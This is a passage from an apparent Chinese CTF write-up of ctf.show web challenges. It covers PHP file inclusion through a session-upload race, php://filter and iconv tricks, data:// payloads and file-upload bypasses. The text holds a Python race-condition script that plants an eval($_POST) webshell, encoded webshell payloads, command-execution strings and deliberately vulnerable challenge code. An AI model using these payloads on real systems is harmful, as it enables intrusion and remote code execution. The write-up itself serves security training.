为了彻底销毁会话，比如在用户退出登录的时候，必须同时重置会话 ID。   如果是通过 cookie 方式传送会话 ID 的，那么同时也需要   调用 <strong>setcookie()</strong> 函数来   删除客户端的会话 cookie。 </p><p><strong>Hints：</strong>这里需要多添加session_start()来建立会话</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html><html><body><form action="http://e0095d68-5aa1-477e-9294-4ee1c0d46581.challenge.ctf.show:8080/" method="POST" enctype="multipart/form-data">    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />    <input type="file" name="file" />    <input type="submit" value="submit" /></form></body></html><?phpsession_start();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大佬脚本(可以一把梭到web86，没有测试过只是帖一下不知道好用不好用)：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            <span class="token string">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/'</span><span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_{sessid}'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token operator">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依然得到fl0g.php</p><p>然后同样利用条件竞争来读取即可线程20左右很快就读取到了</p><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p>看了一下剩下一直到web86的Hint，发现一摸一样所以就只帖一下源码，不打算重复操作了其实既然明白了session.upload_process对文件上传的处理过程，这种题目就已经没有了多大意义了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面多了一个删除的命令，但是因为session.upload_progress.cleanup = “1”的作用重复了，所以只要访问够快，就一定可以访问到，所以没去尝试，原理一样</p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同理，将你访问的文件进行判断是否有&lt;这个符号，有就直接挂，感觉竞争上的话应该也可以</p><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'还要秀？'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_include_path</span><span class="token punctuation">(</span>还要秀？<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义一个常量，值为当前目录的路径，经过测试：/var/www/html竞争依然可以行得通</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php die('大佬别秀了');?>"</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先了解一些<a href="https://blog.csdn.net/Swocky/article/details/86741674?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242" target="_blank" rel="noopener">base64编码的原理</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1" target="_blank" rel="noopener">谈一谈php://filter的妙用 |p神的文章</a></p><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1.利用gir传参决定以base64的方式写入1.php</p><p>2.由于base64特殊符号只识别/+所以多加两位密文字母做到4的整数位来使其符合base64的位数</p><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre><code>?file=php://filter/write=convert.base64-decode/resource=666.php这个地方get传参需要两次url编码content=yyPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==此处base64解码：&lt;?php @eval($_POST[1]);?&gt;</code></pre><p>然后访问666.php配合hackbar执行一句话木马即可</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>data伪协议就能过</p><pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg    //&lt;?php system(&quot;ls&quot;); ?&gt;删除了最后的两个==?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwwZy5waHAiKTsgPz4    //&lt;?php system(&quot;cat fl0g.php&quot;); ?&gt;删除了最后的一个=</code></pre><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php die();?>"</span><span class="token punctuation">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用各种编码绕过：</p><p><a href="https://xz.aliyun.com/t/8163#toc-12" target="_blank" rel="noopener">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></p><pre><code>iconv ( string $in_charset , string $out_charset , string $str ) : string将字符串 str 从 in_charset 转换编码到 out_charset。in_charset：输入的字符集。out_charset：输出的字符集。</code></pre><p>利用脚本（php版本需要控制在5.2左右）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UCS-2LE"</span><span class="token punctuation">,</span><span class="token string">"UCS-2BE"</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[hack]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hp</span> <span class="token attr-name">pe@av(l_$OPTSh[ca]k;)</span><span class="token punctuation">></span></span></span><span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为是两位进行一次反转，所以要尽量保证你的总字符串位数为偶数</p><h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><pre><code>?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpcontents=?&lt;hp pe@av(l_$OPTSh[ca]k;)&gt;?</code></pre><p>getshell！！！</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>user.ini官方文档：</p><pre><code>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</code></pre><p>.user.ini文件</p><pre><code>auto_append_file=hack.pngauto_prepend_file=hack.png</code></pre><p>此文件使用其他要求：</p><p>同目录下有php文件来包含你上传的木马文件</p><h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>尝试使用短标签绕过<br>对于php的标签其他写法，我们这里多说几种<br>1、</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span> <span class="token keyword">echo</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token delimiter">?></span>前提是开启配置参数short_open_tags<span class="token operator">=</span>on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter">?></span>  等价于 <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter">?></span>不需要开启参数设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3、</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">echo</span> <span class="token attr-name">'123';%</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。<br>4、</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span>”php”</span><span class="token punctuation">></span></span><span class="token script language-javascript">echo <span class="token string">'123'</span><span class="token punctuation">;</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不需要修改参数开关，但是只能在7.0以下可用。<br>对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过，图片内容<code>&lt;?=eval($_POST[1]);?&gt;</code><br>剩下的步骤同153</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>在前面的基础上过滤了 <code>[]</code>那我们直接用{}来代替<br>图片马内容<code>&lt;?=eval($_POST{1});?&gt;</code></p><h2 id="web157-158-159"><a href="#web157-158-159" class="headerlink" title="web157 158 159"></a>web157 158 159</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`tac <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>f<span class="token operator">*</span>`<span class="token delimiter">?></span><span class="token comment" spellcheck="true">//159过滤了括号可以用这个绕过</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'tac ../f*'</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>制作图片马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token keyword">include</span><span class="token string">"/var/lo"</span><span class="token punctuation">.</span><span class="token string">"g/nginx/access.lo"</span><span class="token punctuation">.</span><span class="token string">"g"</span><span class="token delimiter">?></span>copy <span class="token number">1</span><span class="token punctuation">.</span>png<span class="token operator">/</span>b <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">.</span>php<span class="token operator">/</span>a cnm<span class="token punctuation">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用.user.ini</p><pre><code>auto_prepend_file=&quot;cnm.png&quot;</code></pre><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>UA头注入一句话木马，蚁剑连接即可</p><p>upload.php源代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"文件超过1024KB"</span><span class="token 